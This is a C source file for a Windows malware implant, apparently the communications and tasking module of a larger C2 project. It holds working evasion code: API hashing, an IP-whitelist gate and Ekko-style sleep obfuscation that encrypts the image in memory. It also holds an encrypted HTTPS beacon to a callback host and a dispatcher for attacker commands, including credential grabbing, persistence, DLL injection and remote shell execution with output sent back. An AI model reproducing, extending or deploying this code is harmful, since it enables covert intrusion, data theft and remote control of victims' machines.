#include "comms.h"
#include "anti_analysis.h"
#include "beacon.h"
#include "common.h"
#include "crypto.h"
#include "evasion.h"
#include "injection.h"
#include "killswitch.h"
#include "persist.h"
#include "postex.h"
#include "recon.h"


#define INITIAL_SEED 5
#define C_PTR(x) (PVOID)(x)
#define U_PTR(x) (UINT_PTR)(x)

static UINT32 _Rotr32(UINT32 Value, UINT Count) {
  DWORD Mask = (CHAR_BIT * sizeof(Value) - 1);
  Count &= Mask;
#pragma warning(push)
#pragma warning(disable : 4146)
  return (Value >> Count) | (Value << ((-Count) & Mask));
#pragma warning(pop)
}

INT HashStringRotr32A(_In_ PCHAR String) {
  INT Value = 0;
  for (INT i = 0; i < lstrlenA(String); i++)
    Value = String[i] + _Rotr32(Value, INITIAL_SEED);
  return Value;
}

INT HashStringRotr32W(_In_ PWCHAR String) {
  INT Value = 0;
  for (INT i = 0; i < lstrlenW(String); i++)
    Value = String[i] + _Rotr32(Value, INITIAL_SEED);
  return Value;
}

HMODULE GetModuleHandleH(DWORD moduleHash) {
#ifdef _WIN64
  PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
  PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
  PPEB_LDR_DATA pLdr = pPeb->Ldr;
  PLIST_ENTRY pStart = &pLdr->InMemoryOrderModuleList;
  PLIST_ENTRY pEntry = pStart->Flink;

  while (pEntry != pStart) {
    PLDR_DATA_TABLE_ENTRY pMod =
        CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    if (pMod->BaseDllName.Buffer != NULL)
      if ((DWORD)HashStringRotr32W(pMod->BaseDllName.Buffer) == moduleHash)
        return (HMODULE)pMod->DllBase;
    pEntry = pEntry->Flink;
  }
  return NULL;
}

FARPROC GetProcAddressH(HMODULE hModule, DWORD funcHash) {
  if (!hModule)
    return NULL;

  PBYTE pBase = (PBYTE)hModule;

  PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
  if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
    return NULL;

  PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
  if (pNt->Signature != IMAGE_NT_SIGNATURE)
    return NULL;

  DWORD expRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                     .VirtualAddress;
  if (!expRva)
    return NULL;

  PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(pBase + expRva);
  PDWORD pNames = (PDWORD)(pBase + pExp->AddressOfNames);
  PWORD pOrds = (PWORD)(pBase + pExp->AddressOfNameOrdinals);
  PDWORD pFuncs = (PDWORD)(pBase + pExp->AddressOfFunctions);

  for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
    PCHAR pName = (PCHAR)(pBase + pNames[i]);
    if ((DWORD)HashStringRotr32A(pName) == funcHash)
      return (FARPROC)(pBase + pFuncs[pOrds[i]]);
  }
  return NULL;
}



 ULONG GetCurrentIpAddress(VOID) {
  INTERFACE_INFO Interfaces[10] = {0};
  WSADATA Data = {0};
  SOCKET Socket = {0};
  ULONG AddressIp = 0;
  ULONG Length = 0;

  RtlSecureZeroMemory(&Interfaces, sizeof(Interfaces));

  if (WSAStartup(MAKEWORD(2, 2), &Data) != 0)
    goto END;
  if ((Socket = WSASocketW(AF_INET, SOCK_DGRAM, 0, 0, 0, 0)) == INVALID_SOCKET)
    goto END;
  if (WSAIoctl(Socket, SIO_GET_INTERFACE_LIST, 0, 0, &Interfaces,
               sizeof(Interfaces), &Length, 0, 0) != 0)
    goto END;

  for (int i = 0; i < ARRAYSIZE(Interfaces); i++) {
    if ((Interfaces[i].iiFlags & IFF_UP) &&
        !(Interfaces[i].iiFlags & IFF_LOOPBACK)) {
      AddressIp = Interfaces[i].iiAddress.AddressIn.sin_addr.S_un.S_addr;
      break;
    }
  }
END:
  WSACleanup();
  return AddressIp;
}

BOOL ip_whitelist_gate(VOID) {
  ULONG start = inet_addr(WHITELIST_SUBNET_START);
  ULONG end = inet_addr(WHITELIST_SUBNET_END);
  ULONG ip = GetCurrentIpAddress();

  if (ip >= start && ip <= end)
    return TRUE;

  ExitProcess(0); // silent exit
  return FALSE;   // unreachable — satisfies compiler
}



BOOL checking_connection(BOOL *Connection) {
  *Connection = FALSE;

  HINTERNET hSession = NULL;
  HINTERNET hConnect = NULL;
  HINTERNET hRequest = NULL;
  DWORD statusCode = 0;
  DWORD statusSize = sizeof(DWORD);

  hSession = WinHttpOpen(g_CallbackUserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                         WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (!hSession)
    goto cleanup;

  hConnect = WinHttpConnect(hSession, g_CallbackHost, CALLBACK_PORT, 0);
  if (!hConnect)
    goto cleanup;

  hRequest =
      WinHttpOpenRequest(hConnect, L"GET", NULL, NULL, WINHTTP_NO_REFERER,
                         WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
  if (!hRequest)
    goto cleanup;
#ifdef BEACON_TEST
  DWORD dwFlags1 = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                   SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                   SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                   SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
  WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags1,
                   sizeof(dwFlags1));
#endif

  if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                          WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
    goto cleanup;

  if (!WinHttpReceiveResponse(hRequest, NULL))
    goto cleanup;

  WinHttpQueryHeaders(hRequest,
                      WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                      WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize,
                      WINHTTP_NO_HEADER_INDEX);

  if (statusCode == 200)
    *Connection = TRUE;

cleanup:
  if (hRequest)
    WinHttpCloseHandle(hRequest);
  if (hConnect)
    WinHttpCloseHandle(hConnect);
  if (hSession)
    WinHttpCloseHandle(hSession);
  return *Connection;
}



static ULONG Random32(VOID) {
  unsigned int Seed = 0;
  _rdrand32_step(&Seed);
  return Seed;
}

static BOOL InitializeWinApi32(OUT PWIN32_API pWin32Apis) {
  HMODULE hNtdll = GetModuleHandleA("ntdll");
  HMODULE hAdvapi32 = LoadLibraryA("Advapi32");

  if (!hNtdll || !hAdvapi32) {
    printf("[!] InitializeWinApi32: module load failed\n");
    return FALSE;
  }

  pWin32Apis->RtlCreateTimerQueue =
      (void *)GetProcAddress(hNtdll, "RtlCreateTimerQueue");
  pWin32Apis->RtlCreateTimer = (void *)GetProcAddress(hNtdll, "RtlCreateTimer");
  pWin32Apis->RtlDeleteTimerQueue =
      (void *)GetProcAddress(hNtdll, "RtlDeleteTimerQueue");
  pWin32Apis->NtCreateEvent = (void *)GetProcAddress(hNtdll, "NtCreateEvent");
  pWin32Apis->NtWaitForSingleObject =
      (void *)GetProcAddress(hNtdll, "NtWaitForSingleObject");
  pWin32Apis->NtSignalAndWaitForSingleObject =
      (void *)GetProcAddress(hNtdll, "NtSignalAndWaitForSingleObject");
  pWin32Apis->SystemFunction032 =
      (void *)GetProcAddress(hAdvapi32, "SystemFunction032");
  pWin32Apis->NtContinue = (void *)GetProcAddress(hNtdll, "NtContinue");

  if (!pWin32Apis->RtlCreateTimerQueue || !pWin32Apis->RtlCreateTimer ||
      !pWin32Apis->NtCreateEvent || !pWin32Apis->NtContinue ||
      !pWin32Apis->SystemFunction032) {
    printf("[!] InitializeWinApi32: one or more pointers NULL\n");
    return FALSE;
  }
  return TRUE;
}

static VOID EkkoObf(IN PWIN32_API pWin32Apis, IN DWORD dwTimeOut) {
  NTSTATUS Status = STATUS_SUCCESS;
  USTRING Key = {0};
  USTRING Img = {0};
  BYTE Rnd[16] = {0};
  CONTEXT Ctx[7] = {0};
  CONTEXT CtxInit = {0};
  HANDLE EvntTimer = NULL, EvntStart = NULL, EvntEnd = NULL;
  HANDLE Queue = NULL, Timer = NULL;
  DWORD Delay = 0, Value = 0;

  PVOID ImageBase = GetModuleHandleA(NULL);
  ULONG ImageSize =
      ((PIMAGE_NT_HEADERS)(U_PTR(ImageBase) +
                           ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew))
          ->OptionalHeader.SizeOfImage;

  for (int i = 0; i < 16; i++)
    Rnd[i] = (BYTE)Random32();

  Key.Buffer = (PCHAR)Rnd;
  Key.Length = sizeof(Rnd);
  Img.Buffer = (PCHAR)ImageBase;
  Img.Length = (USHORT)ImageSize;

  if (!NT_SUCCESS(Status = pWin32Apis->RtlCreateTimerQueue(&Queue)))
    goto LEAVE;

  if (!NT_SUCCESS(pWin32Apis->NtCreateEvent(&EvntTimer, EVENT_ALL_ACCESS, NULL,
                                            NotificationEvent, FALSE)) ||
      !NT_SUCCESS(pWin32Apis->NtCreateEvent(&EvntStart, EVENT_ALL_ACCESS, NULL,
                                            NotificationEvent, FALSE)) ||
      !NT_SUCCESS(pWin32Apis->NtCreateEvent(&EvntEnd, EVENT_ALL_ACCESS, NULL,
                                            NotificationEvent, FALSE)))
    goto LEAVE;

  if (!NT_SUCCESS(pWin32Apis->RtlCreateTimer(
          Queue, &Timer, (WAITORTIMERCALLBACKFUNC)RtlCaptureContext, &CtxInit,
          Delay += 100, 0, WT_EXECUTEINTIMERTHREAD)) ||
      !NT_SUCCESS(pWin32Apis->RtlCreateTimer(
          Queue, &Timer, (WAITORTIMERCALLBACKFUNC)SetEvent, EvntTimer,
          Delay += 100, 0, WT_EXECUTEINTIMERTHREAD)))
    goto LEAVE;

  if (!NT_SUCCESS(pWin32Apis->NtWaitForSingleObject(EvntTimer, FALSE, NULL)))
    goto LEAVE;

  for (int i = 0; i < 7; i++) {
    memcpy(&Ctx[i], &CtxInit, sizeof(CONTEXT));
    Ctx[i].Rsp -= sizeof(PVOID);
  }

  // ROP chain — 7 frames
  Ctx[0].Rip = U_PTR(WaitForSingleObjectEx);
  Ctx[0].Rcx = U_PTR(EvntStart);
  Ctx[0].Rdx = U_PTR(INFINITE);
  Ctx[0].R8 = U_PTR(FALSE);
  Ctx[1].Rip = U_PTR(VirtualProtect);
  Ctx[1].Rcx = U_PTR(ImageBase);
  Ctx[1].Rdx = U_PTR(ImageSize);
  Ctx[1].R8 = U_PTR(PAGE_READWRITE);
  Ctx[1].R9 = U_PTR(&Value);
  Ctx[2].Rip = U_PTR(pWin32Apis->SystemFunction032);
  Ctx[2].Rcx = U_PTR(&Img);
  Ctx[2].Rdx = U_PTR(&Key);
  Ctx[3].Rip = U_PTR(WaitForSingleObjectEx);
  Ctx[3].Rcx = U_PTR(GetCurrentProcess());
  Ctx[3].Rdx = U_PTR(dwTimeOut);
  Ctx[3].R8 = U_PTR(FALSE);
  Ctx[4].Rip = U_PTR(pWin32Apis->SystemFunction032);
  Ctx[4].Rcx = U_PTR(&Img);
  Ctx[4].Rdx = U_PTR(&Key);
  Ctx[5].Rip = U_PTR(VirtualProtect);
  Ctx[5].Rcx = U_PTR(ImageBase);
  Ctx[5].Rdx = U_PTR(ImageSize);
  Ctx[5].R8 = U_PTR(PAGE_EXECUTE_READ);
  Ctx[5].R9 = U_PTR(&Value);
  Ctx[6].Rip = U_PTR(SetEvent);
  Ctx[6].Rcx = U_PTR(EvntEnd);

  for (int i = 0; i < 7; i++) {
    if (!NT_SUCCESS(pWin32Apis->RtlCreateTimer(
            Queue, &Timer, (WAITORTIMERCALLBACKFUNC)pWin32Apis->NtContinue,
            &Ctx[i], Delay += 100, 0, WT_EXECUTEINTIMERTHREAD)))
      goto LEAVE;
  }

  pWin32Apis->NtSignalAndWaitForSingleObject(EvntStart, EvntEnd, FALSE, NULL);

LEAVE:
  if (Queue)
    pWin32Apis->RtlDeleteTimerQueue(Queue);
  if (EvntTimer)
    CloseHandle(EvntTimer);
  if (EvntStart)
    CloseHandle(EvntStart);
  if (EvntEnd)
    CloseHandle(EvntEnd);
}

static WIN32_API g_Win32Api = {0};
static BOOL g_ApiInit = FALSE;

VOID ekko_sleep(DWORD sleepMs) {
  if (!g_ApiInit) {
    if (!InitializeWinApi32(&g_Win32Api)) {
      printf("[!] ekko_sleep: API init failed, falling back to Sleep()\n");
      Sleep(sleepMs);
      return;
    }
    g_ApiInit = TRUE;
  }
  EkkoObf(&g_Win32Api, sleepMs);
}



BOOL beacon_post(BYTE *payload, DWORD payloadLen, BYTE **responseOut,
                 DWORD *responseLenOut) {
  BOOL bSuccess = FALSE;
  HINTERNET hSession = NULL;
  HINTERNET hConnect = NULL;
  HINTERNET hRequest = NULL;
  HMODULE hWinHttp = NULL;
  DWORD statusCode = 0;
  DWORD statusSize = sizeof(DWORD);
  PVOID pEncrypted = NULL;
  DWORD dwEncryptSize = 0;
  BYTE *pResponse = NULL;
  DWORD dwRespTotal = 0;
  BYTE chunk[READ_CHUNK_SIZE] = {0};
  DWORD dwBytesRead = 0;
  PVOID pDecrypted = NULL;
  DWORD dwDecryptSize = 0;

  // encrypt outbound payload
  if (!aes_encrypt_payload(payload, payloadLen, &pEncrypted, &dwEncryptSize)) {
    printf("[!] aes_encrypt_payload failed\n");
    goto CLEANUP;
  }

  // resolve WinHTTP module via hash
  // resolve WinHTTP module via hash
  hWinHttp = GetModuleHandleH(WINHTTP_DLL_HASH);
  printf("[COMMS] GetModuleHandleH: %p\n", hWinHttp);
  if (!hWinHttp)
    hWinHttp = LoadLibraryA("winhttp.dll");
  if (!hWinHttp) {
    printf("[!] winhttp.dll not found\n");
    goto CLEANUP;
  }
  printf("[COMMS] winhttp.dll loaded at %p\n", hWinHttp);

  fnWinHttpOpen pOpen =
      (fnWinHttpOpen)GetProcAddressH(hWinHttp, WinHttpOpen_HASH);
  fnWinHttpConnect pConnect =
      (fnWinHttpConnect)GetProcAddressH(hWinHttp, WinHttpConnect_HASH);
  fnWinHttpOpenRequest pOpenReq =
      (fnWinHttpOpenRequest)GetProcAddressH(hWinHttp, WinHttpOpenRequest_HASH);
  fnWinHttpSendRequest pSend =
      (fnWinHttpSendRequest)GetProcAddressH(hWinHttp, WinHttpSendRequest_HASH);
  fnWinHttpReceiveResponse pRecv = (fnWinHttpReceiveResponse)GetProcAddressH(
      hWinHttp, WinHttpReceiveResponse_HASH);
  fnWinHttpReadData pRead =
      (fnWinHttpReadData)GetProcAddressH(hWinHttp, WinHttpReadData_HASH);
  fnWinHttpCloseHandle pClose =
      (fnWinHttpCloseHandle)GetProcAddressH(hWinHttp, WinHttpCloseHandle_HASH);
  fnWinHttpQueryHeaders pQuery = (fnWinHttpQueryHeaders)GetProcAddressH(
      hWinHttp, WinHttpQueryHeaders_HASH);

  printf("[COMMS] Hash resolution: Open=%p Connect=%p OpenReq=%p Send=%p\n",
         pOpen, pConnect, pOpenReq, pSend);
  printf("[COMMS] Hash resolution: Recv=%p Read=%p Close=%p Query=%p\n", pRecv,
         pRead, pClose, pQuery);

  if (!pOpen || !pConnect || !pOpenReq || !pSend || !pRecv || !pRead ||
      !pClose || !pQuery) {
    printf("[!] WinHTTP hash resolution failed\n");
    goto CLEANUP;
  }

  
  hSession = pOpen(g_CallbackUserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                   WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (!hSession)
    goto CLEANUP;

  hConnect = pConnect(hSession, g_CallbackHost, CALLBACK_PORT, 0);
  if (!hConnect)
    goto CLEANUP;
  hRequest = pOpenReq(hConnect, L"POST", g_CallbackEndpoint, NULL, WINHTTP_NO_REFERER,
                      WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
  if (!hRequest) {
    printf("[!] pOpenReq FAILED: %lu\n", GetLastError());
    goto CLEANUP;
  }
  printf("[COMMS] pOpenReq OK\n");

#ifdef BEACON_TEST
  printf("[COMMS] Setting cert bypass flags\n");
  DWORD dwFlags2 = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                   SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                   SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                   SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
  if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags2,
                        sizeof(dwFlags2)))
    printf("[!] WinHttpSetOption FAILED: %lu\n", GetLastError());
  else
    printf("[COMMS] Cert bypass set OK\n");
#endif

  printf("[COMMS] Sending %lu encrypted bytes to %S:%d%S\n", dwEncryptSize,
         g_CallbackHost, CALLBACK_PORT, g_CallbackEndpoint);
  if (!pSend(hRequest, L"Content-Type: application/octet-stream\r\n",
             (DWORD)-1L, pEncrypted, dwEncryptSize, dwEncryptSize, 0)) {
    printf("[!] pSend FAILED: %lu\n", GetLastError());
    goto CLEANUP;
  }
  printf("[COMMS] pSend OK\n");

  if (!pRecv(hRequest, NULL)) {
    printf("[!] pRecv FAILED: %lu\n", GetLastError());
    goto CLEANUP;
  }
  printf("[COMMS] pRecv OK\n");

  pQuery(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
         WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize,
         WINHTTP_NO_HEADER_INDEX);
  printf("[COMMS] HTTP status: %lu\n", statusCode);

  if (statusCode != 200) {
    bSuccess = TRUE;
    goto CLEANUP;
  }

  // read response body in chunks
  do {
    dwBytesRead = 0;
    ZeroMemory(chunk, READ_CHUNK_SIZE);
    if (!pRead(hRequest, chunk, READ_CHUNK_SIZE, &dwBytesRead))
      break;
    if (dwBytesRead == 0)
      break;
    if (dwRespTotal + dwBytesRead > MAX_TASK_BLOB_SIZE)
      break; // safety cap

    BYTE *pTemp = pResponse
                      ? (BYTE *)HeapReAlloc(GetProcessHeap(), 0, pResponse,
                                            dwRespTotal + dwBytesRead)
                      : (BYTE *)HeapAlloc(GetProcessHeap(), 0, dwBytesRead);
    if (!pTemp)
      goto CLEANUP;

    pResponse = pTemp;
    memcpy(pResponse + dwRespTotal, chunk, dwBytesRead);
    dwRespTotal += dwBytesRead;
  } while (dwBytesRead == READ_CHUNK_SIZE);

  if (!pResponse || dwRespTotal == 0) {
    bSuccess = TRUE;
    goto CLEANUP;
  }

  // decrypt inbound task blob
  if (!aes_decrypt_payload(pResponse, dwRespTotal, &pDecrypted,
                           &dwDecryptSize)) {
    printf("[!] aes_decrypt_payload failed\n");
    goto CLEANUP;
  }

  *responseOut = (BYTE *)pDecrypted;
  *responseLenOut = dwDecryptSize;
  bSuccess = TRUE;

CLEANUP:
  if (pEncrypted)
    HeapFree(GetProcessHeap(), 0, pEncrypted);
  if (pResponse)
    HeapFree(GetProcessHeap(), 0, pResponse);
  if (hRequest)
    pClose(hRequest);
  if (hConnect)
    pClose(hConnect);
  if (hSession)
    pClose(hSession);
  return bSuccess;
}



DWORD jitter(DWORD baseMs) {
  DWORD variation = (baseMs * JITTER_PERCENT) / 100;
  if (variation == 0)
    return baseMs;
  unsigned int rnd = 0;
  _rdrand32_step(&rnd);
  return baseMs - variation + (rnd % (2 * variation));
}



static BOOL json_get_string(const CHAR *json, const CHAR *key, CHAR *out,
                            DWORD outMax) {
  CHAR pattern[128];
  wsprintfA(pattern, "\"%s\":\"", key);
  const CHAR *start = strstr(json, pattern);
  if (!start) {
    wsprintfA(pattern, "\"%s\": \"", key);
    start = strstr(json, pattern);
    if (!start)
      return FALSE;
  }
  start = strchr(start, ':');
  if (!start)
    return FALSE;
  start++;
  while (*start == ' ')
    start++;
  if (*start != '"')
    return FALSE;
  start++;
  DWORD i = 0;
  while (*start && *start != '"' && i < outMax - 1)
    out[i++] = *start++;
  out[i] = '\0';
  return i > 0;
}

static BOOL json_value_is_null(const CHAR *json, const CHAR *key) {
  CHAR pattern[128];
  wsprintfA(pattern, "\"%s\":", key);
  const CHAR *start = strstr(json, pattern);
  if (!start)
    return TRUE;
  start = strchr(start, ':');
  if (!start)
    return TRUE;
  start++;
  while (*start == ' ')
    start++;
  return (strncmp(start, "null", 4) == 0);
}

VOID dispatch_task(BYTE *taskBlob, DWORD taskBlobLen) {
  if (!taskBlob || taskBlobLen < 2)
    return;

  CHAR *json = (CHAR *)taskBlob;
  CHAR *tmp = NULL;

  if (json[taskBlobLen - 1] != '\0') {
    tmp = (CHAR *)HeapAlloc(GetProcessHeap(), 0, taskBlobLen + 1);
    if (!tmp)
      return;
    memcpy(tmp, json, taskBlobLen);
    tmp[taskBlobLen] = '\0';
    json = tmp;
  }

  CHAR command[64] = {0};
  CHAR args[MAX_PATH] = {0};
  CHAR taskId[64] = {0};

  json_get_string(json, "id", taskId, sizeof(taskId));
  if (!json_get_string(json, "command", command, sizeof(command))) {
    printf("[!] dispatch_task: no command field\n");
    goto cleanup;
  }

  BOOL hasArgs = !json_value_is_null(json, "args");
  if (hasArgs)
    json_get_string(json, "args", args, sizeof(args));

  printf("[*] task id=%s cmd=%s args=%s\n", taskId, command,
         hasArgs ? args : "(null)");

  // dispatch 
  if (strcmp(command, "grab_creds") == 0 ||
      strcmp(command, "screenshot") == 0) {
    postex_run(command);

  } else if (strcmp(command, "persist_reg") == 0) {
    if (hasArgs)
      persist_registry_run(args);

  } else if (strcmp(command, "persist_com") == 0) {
    if (hasArgs)
      persist_com_hijack(args);

  } else if (strcmp(command, "persist_remove") == 0) {
    persist_remove();

  } else if (strcmp(command, "dll_inject") == 0) {
    if (hasArgs) {
      CHAR *sep = strchr(args, ':');
      if (sep) {
        *sep = '\0';
        dll_inject((DWORD)atol(args), sep + 1);
      }
    }

  } else if (strcmp(command, "shell") == 0) {
    if (hasArgs) {
      CHAR cmdLine[MAX_PATH + 32];
      wsprintfA(cmdLine, "cmd.exe /c %s", args);

      SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
      HANDLE hRead, hWrite;
      if (CreatePipe(&hRead, &hWrite, &sa, 0)) {
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdOutput = hWrite;
        si.hStdError = hWrite;

        if (CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW,
                           NULL, NULL, &si, &pi)) {
          CloseHandle(hWrite);
          CHAR outBuf[8192] = {0};
          DWORD bytesRead = 0;
          ReadFile(hRead, outBuf, sizeof(outBuf) - 1, &bytesRead, NULL);
          WaitForSingleObject(pi.hProcess, 10000);
          CloseHandle(pi.hProcess);
          CloseHandle(pi.hThread);
          CloseHandle(hRead);

          DWORD jsonLen = (bytesRead * 2) + 512;
          CHAR *resultJson = (CHAR *)HeapAlloc(GetProcessHeap(), 0, jsonLen);
          if (resultJson) {
            int n = wsprintfA(resultJson, "{\"task_id\":\"%s\",\"output\":\"",
                              taskId);
            for (DWORD i = 0; i < bytesRead && n < (int)jsonLen - 32; i++) {
              if (outBuf[i] == '"' || outBuf[i] == '\\')
                resultJson[n++] = '\\';
              if (outBuf[i] == '\n') {
                resultJson[n++] = '\\';
                resultJson[n++] = 'n';
              } else if (outBuf[i] == '\r')
                continue;
              else
                resultJson[n++] = outBuf[i];
            }
            n += wsprintfA(resultJson + n, "\",\"exit_code\":0}");
            BYTE *resp = NULL;
            DWORD respLen = 0;
            beacon_post((BYTE *)resultJson, n, &resp, &respLen);
            HeapFree(GetProcessHeap(), 0, resultJson);
            if (resp)
              HeapFree(GetProcessHeap(), 0, resp);
          }
        } else {
          CloseHandle(hWrite);
          CloseHandle(hRead);
        }
      }
    }

  } else if (strcmp(command, "whoami") == 0) {
    CHAR user[256] = {0}, host[256] = {0};
    DWORD uLen = sizeof(user), hLen = sizeof(host);
    GetUserNameA(user, &uLen);
    GetComputerNameA(host, &hLen);
    CHAR result[600];
    int n = wsprintfA(
        result, "{\"task_id\":\"%s\",\"output\":\"%s\\\\%s\",\"exit_code\":0}",
        taskId, host, user);
    BYTE *resp = NULL;
    DWORD respLen = 0;
    beacon_post((BYTE *)result, n, &resp, &respLen);
    if (resp)
      HeapFree(GetProcessHeap(), 0, resp);

  } else if (strcmp(command, "kill_hard") == 0) {
    killswitch_hard();

  } else if (strcmp(command, "kill_soft") == 0) {
    killswitch_soft();

  } else {
    printf("[!] Unknown command: %s\n", command);
  }

cleanup:
  if (json != (CHAR *)taskBlob)
    HeapFree(GetProcessHeap(), 0, json);
}